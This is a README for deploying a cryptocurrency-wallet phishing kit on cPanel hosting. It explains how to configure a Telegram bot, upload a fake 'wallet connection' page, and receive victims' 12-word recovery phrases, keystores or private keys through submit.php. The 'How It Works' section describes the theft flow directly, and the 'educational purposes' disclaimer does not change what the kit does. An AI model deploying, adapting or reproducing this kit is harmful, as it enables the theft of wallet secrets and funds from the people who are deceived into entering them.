# Deployment Instructions for cPanel Web Hosting

This guide will help you deploy this project to your cPanel web hosting account.

## 📋 Prerequisites

1. A cPanel web hosting account with PHP support (PHP 7.0 or higher)
2. Telegram Bot Token (from @BotFather)
3. Your Telegram Chat ID (from @userinfobot)

## 🚀 Step-by-Step Deployment

### Step 1: Get Your Telegram Credentials

1. **Get Bot Token:**
   - Open Telegram and search for `@BotFather`
   - Send `/newbot` command
   - Follow the instructions to create a bot
   - Copy the bot token (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

2. **Get Your Chat ID:**
   - Open Telegram and search for `@userinfobot`
   - Start a conversation with the bot
   - The bot will reply with your Chat ID (a number like: `123456789`)

### Step 2: Configure the Project

1. Open `config.php` in a text editor
2. Replace `YOUR_BOT_TOKEN_HERE` with your actual Telegram Bot Token
3. Replace `YOUR_CHAT_ID_HERE` with your actual Telegram Chat ID
4. Save the file

Example:
```php
define('TELEGRAM_BOT_TOKEN', '123456789:ABCdefGHIjklMNOpqrsTUVwxyz');
define('TELEGRAM_CHAT_ID', '123456789');
```

### Step 3: Upload Files to cPanel

1. **Log into cPanel:**
   - Go to your hosting provider's cPanel login page
   - Enter your username and password

2. **Open File Manager:**
   - Find and click on "File Manager" in cPanel
   - Navigate to `public_html` (or your domain's root directory)

3. **Upload Files:**
   - Select all files and folders from this project
   - Upload them to `public_html`
   - Make sure the folder structure is preserved:
     ```
     public_html/
     ├── index.html
     ├── config.php
     ├── submit.php
     ├── .htaccess
     ├── wallet/
     ├── *.css
     ├── *.png
     └── *.woff2
     ```

### Step 4: Set File Permissions

1. In File Manager, right-click on `config.php`
2. Select "Change Permissions"
3. Set permissions to `644` (readable by owner and group, writable by owner only)
4. Do the same for `submit.php` and `.htaccess`

### Step 5: Test the Installation

1. Visit your website: `https://yourdomain.com`
2. Navigate to the wallet connection page
3. Enter a test 12-word phrase (use dummy words for testing)
4. Click "Import"
5. Check your Telegram - you should receive a message with the test data

## 🔒 Security Notes

- **Never share your `config.php` file** - it contains sensitive credentials
- The `.htaccess` file is configured to block direct access to `config.php`
- Keep your Telegram Bot Token secret
- Regularly check your Telegram for received data

## 🐛 Troubleshooting

### Issue: "Telegram configuration not set"
- **Solution:** Make sure you've updated `config.php` with your actual credentials

### Issue: "Failed to send to Telegram"
- **Solution:** 
  - Verify your Bot Token is correct
  - Verify your Chat ID is correct
  - Make sure your bot hasn't been blocked
  - Check if your hosting allows outbound HTTPS connections

### Issue: Form doesn't submit
- **Solution:**
  - Check browser console for JavaScript errors
  - Verify `submit.php` is accessible at `https://yourdomain.com/submit.php`
  - Check PHP error logs in cPanel

### Issue: 500 Internal Server Error
- **Solution:**
  - Check PHP version (needs PHP 7.0+)
  - Verify file permissions are correct
  - Check cPanel error logs

## 📁 File Structure

```
/
├── index.html              # Main homepage
├── config.php              # Telegram configuration (SECURE THIS FILE!)
├── submit.php              # Form submission handler
├── .htaccess               # Apache configuration
├── wallet/
│   ├── index.html          # Wallet connection page
│   ├── css/
│   ├── js/
│   └── img/
├── *.css                   # Stylesheet files
├── *.png                   # Image files
└── *.woff2                 # Font files
```

## 🔄 How It Works

1. User enters 12-word recovery phrase (or keystore/private key) on the wallet page
2. JavaScript captures the form data
3. Data is sent to `submit.php` via AJAX
4. `submit.php` formats the data and sends it to your Telegram bot
5. You receive a formatted message in Telegram with all the details

## 📞 Support

If you encounter any issues:
1. Check the troubleshooting section above
2. Review cPanel error logs
3. Test your Telegram bot credentials separately
4. Verify PHP is enabled and working on your hosting

---

**Important:** This project is designed for educational purposes. Always ensure you comply with your local laws and regulations regarding data collection and privacy.

